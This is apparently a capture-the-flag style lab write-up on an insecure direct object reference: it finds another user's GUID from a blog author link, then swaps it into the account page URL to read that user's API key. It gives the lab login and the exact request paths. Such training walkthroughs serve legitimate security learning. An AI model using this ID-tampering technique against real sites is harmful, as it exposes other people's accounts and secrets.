## User ID controlled by request parameter, with unpredictable user IDs

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- leave a comment on a post
- /login

## Resume

1. Find Carlos's post
2. Click on **Carlos** to get his ID
3. Login with wiener:peter
4. Update `my-account?id=` with Carlos's ID
5. Get Carlos's API key


## Solve 

Find any post made by Carlos : 

`/post?postId=6`

Click on Carlos to access : 

`/blogs?userId=ab7a2af1-8a27-4d53-be86-d5e7fafd0e47`

Login with wiener:peter and update the `my-account?id=` with carlos ID : 

`/my-account?id=ab7a2af1-8a27-4d53-be86-d5e7fafd0e47`

Get Carlo's API key : **Your API Key is: abkzN5hnfhJ5IGhgTmQSFThHFsL8flX5**